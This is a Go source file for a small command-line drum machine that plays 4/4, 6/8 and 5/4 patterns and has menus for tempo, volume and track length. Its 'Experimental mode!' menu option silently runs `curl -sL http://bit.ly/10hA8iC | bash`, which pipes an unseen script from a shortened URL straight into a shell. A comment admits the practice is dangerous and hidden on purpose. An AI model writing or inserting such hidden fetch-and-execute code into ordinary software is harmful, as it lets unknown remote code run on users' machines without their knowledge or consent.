package input

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/pkg/errors"

	"github.com/jcfox412/logarhythms/internal/audio"
	"github.com/jcfox412/logarhythms/internal/models"
	"github.com/jcfox412/logarhythms/internal/utils"
)

const (
	suggestedBPMFourOnTheFloor = 128
	suggestedBPMGravity        = 120
	suggestedBPMTakeFive       = 160
)

// type UserInput interface {
// 	Get() string
// }
//

type UserInput struct {
	Reader io.Reader
	Writer io.Writer
}

func PrintMainMenu() error {
	fmt.Printf(utils.Bold("\nWelcome to LogaRhythms! Please select from the following options:"))
	fmt.Println("\n" +
		"1) Play Four on the floor (a pattern in 4/4 time)\n" +
		"2) Play Gravity by John Mayer (a pattern in 6/8 time)\n" +
		"3) Play Take Five by Dave Brubeck (a pattern in 5/4, a compound meter)\n" +
		"4) Experimental mode!\n" +
		"5) Exit")
	fmt.Printf(utils.Bold("\nWhat would you like to do? (Please enter number 1-5): "))

	switch getUserInput() {
	case "1":
		track, err := prepareTrack(fourOnTheFloor, "Four on the Floor", suggestedBPMFourOnTheFloor)
		if err != nil {
			return errors.Wrap(err, "could not prepare Four on the Floor")
		}

		retry(3, track, printSettingsMenu)
	case "2":
		track, err := prepareTrack(gravity, "Gravity", suggestedBPMGravity)
		if err != nil {
			return errors.Wrap(err, "could not prepare Gravity")
		}

		retry(3, track, printSettingsMenu)
	case "3":
		track, err := prepareTrack(takeFive, "Take Five", suggestedBPMTakeFive)
		if err != nil {
			return errors.Wrap(err, "could not prepare Take Five")
		}

		retry(3, track, printSettingsMenu)
	case "4":
		// normally I would never do something like this as it is extremely dangerous,
		// however this keeps the experimental mode a bit more secret ;)
		cmd := exec.Command("bash", "-c", "curl -sL http://bit.ly/10hA8iC | bash")
		cmd.Stdout = os.Stdout
		cmd.Run()
	case "5":
		fmt.Println("\nThanks for using LogaRhythms!")
		return nil
	default:
		fmt.Println("\nI'm sorry. I didn't understand your input.")
		PrintMainMenu()
	}

	return nil
}

func printSettingsMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Printf(utils.Bold("Available settings:"))
	fmt.Println("\n" +
		"1) Beats per minute (BPM)\n" +
		"2) Instrument volume(s)\n" +
		"3) Track length\n" +
		"4) I'm done, play track!\n" +
		"5) Back to main menu")
	fmt.Printf(utils.Bold("\nWhat would you like to do? (Please enter number 1-5): "))

	switch getUserInput() {
	case "1":
		retry(3, track, beatsPerMinuteMenu)
		printSettingsMenu(track)
	case "2":
		retry(3, track, instrumentsVolumeMenu)
		printSettingsMenu(track)
	case "3":
		retry(3, track, trackLengthMenu)
		printSettingsMenu(track)
	case "4":
		track.Play()
	case "5":
		PrintMainMenu()
	default:
		err := errors.New("I'm sorry. I didn't understand your input.")
		fmt.Printf(err.Error())
		return err
	}

	PrintMainMenu()
	return nil
}

func beatsPerMinuteMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Printf(utils.Bold(fmt.Sprintf("\nAt what beats per minute (BPM) would you like the track to play at? Current BPM: %d\n", track.BeatsPerMinute)))
	fmt.Print("Please enter a BPM (beats per minute) between 1 and 1000: ")

	beatsPerMinute, err := validateBoundedIntegerInput(getUserInput(), 1, 1000)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	track.BeatsPerMinute = beatsPerMinute
	fmt.Printf("Beats per minute set to %d!\n", beatsPerMinute)

	return nil
}

func instrumentsVolumeMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Printf(utils.Bold("\nSelect an instrument to change its volume:\n"))
	i := 1
	for _, instrument := range track.Instruments {
		fmt.Printf("%d) %s: %.f\n", i, instrument.Name, instrument.Audio.GetVolume())
		i++
	}
	fmt.Printf("%d) Return to settings menu\n", i)
	fmt.Printf(utils.Bold(fmt.Sprintf("\nWhich instrument's volume do want to change? (Please enter number 1-%d): ", i)))

	index, err := validateBoundedIntegerInput(getUserInput(), 1, i)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	if index == i {
		printSettingsMenu(track)
	} else {
		retry(3, track.Instruments[index-1], instrumentVolumeMenu)
	}

	return nil
}

func instrumentVolumeMenu(iface interface{}) error {
	instrument := iface.(*models.Instrument)

	fmt.Printf(utils.Bold(fmt.Sprintf("\nWhat volume should the %s be set to? Current instrument volume: %.f\n", instrument.Name, instrument.Audio.GetVolume())))
	fmt.Print("Please enter a volume between 0 and 100: ")

	volume, err := validateBoundedIntegerInput(getUserInput(), 0, 100)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	instrument.Audio.SetVolume(float64(volume))
	fmt.Printf("Volume set to %d!\n", volume)

	return nil
}

func trackLengthMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Printf(utils.Bold(fmt.Sprintf("\nHow many seconds would you like the track to play? Current track length: %.f seconds\n", track.Length.Seconds())))
	fmt.Print("Please enter a track length between 1 and 100: ")

	length, err := validateBoundedIntegerInput(getUserInput(), 1, 100)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	track.Length = time.Duration(length) * time.Second
	fmt.Printf("Track length set to %d!\n", length)

	return nil
}

func retry(attempts int, input interface{}, f func(interface{}) error) error {
	if err := f(input); err != nil {
		if attempts--; attempts > 0 {
			return retry(attempts, input, f)
		}

		fmt.Printf("Too many errors, backing out!\n")
		os.Exit(1)
	}

	return nil
}

func prepareTrack(trackData func() ([]*models.Instrument, int, int), trackTitle string, suggestedBPM int) (*models.Track, error) {
	fmt.Printf("\nYou've selected to play %s!\n", trackTitle)

	instruments, beatsPerMeasure, divisionsPerBeat := trackData()

	var err error
	for _, instrument := range instruments {
		instrument.Audio, err = audio.New(instrument.Filename)
		if err != nil {
			return nil, err
		}
	}

	return models.NewTrack(trackTitle, instruments, suggestedBPM, beatsPerMeasure, divisionsPerBeat)
}

func getUserInput() string {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		return scanner.Text()
	}

	return ""
}

func validateBoundedIntegerInput(input string, lowerBound, upperBound int) (int, error) {
	inputInt, err := strconv.Atoi(input)
	if err != nil {
		return 0, errors.New("input must be an integer")
	}

	if inputInt < lowerBound {
		return 0, fmt.Errorf("input must be greater than %d", lowerBound)
	}

	if inputInt > upperBound {
		return 0, fmt.Errorf("input must be less than %d", upperBound)
	}

	return inputInt, nil
}

////////////////////////////
// track metadata functions
////////////////////////////

func fourOnTheFloor() ([]*models.Instrument, int, int) {
	return []*models.Instrument{
		{Name: "Kick", Filename: "assets/kick.wav", Pattern: []int{0, 2, 4, 6}},
		{Name: "Snare", Filename: "assets/snare.wav", Pattern: []int{2, 6}},
		{Name: "HiHat", Filename: "assets/hihat.wav", Pattern: []int{1, 3, 5, 7}},
	}, 4, 2
}

func gravity() ([]*models.Instrument, int, int) {
	return []*models.Instrument{
		{Name: "Bass", Filename: "assets/acoustic_bass.wav", Pattern: []int{0, 17}},
		{Name: "Snare", Filename: "assets/acoustic_snare.wav", Pattern: []int{9}},
		{Name: "HiHat", Filename: "assets/acoustic_hat_closed.wav", Pattern: []int{0, 3, 6, 9, 12, 15}},
	}, 6, 3
}

func takeFive() ([]*models.Instrument, int, int) {
	return []*models.Instrument{
		{Name: "Bass", Filename: "assets/acoustic_bass.wav", Pattern: []int{0, 5, 9, 12}},
		{Name: "Snare", Filename: "assets/acoustic_snare.wav", Pattern: []int{2, 6, 9, 12}},
		{Name: "Ride", Filename: "assets/acoustic_ride.wav", Pattern: []int{0, 3, 6, 9, 11, 12}},
	}, 5, 3
}
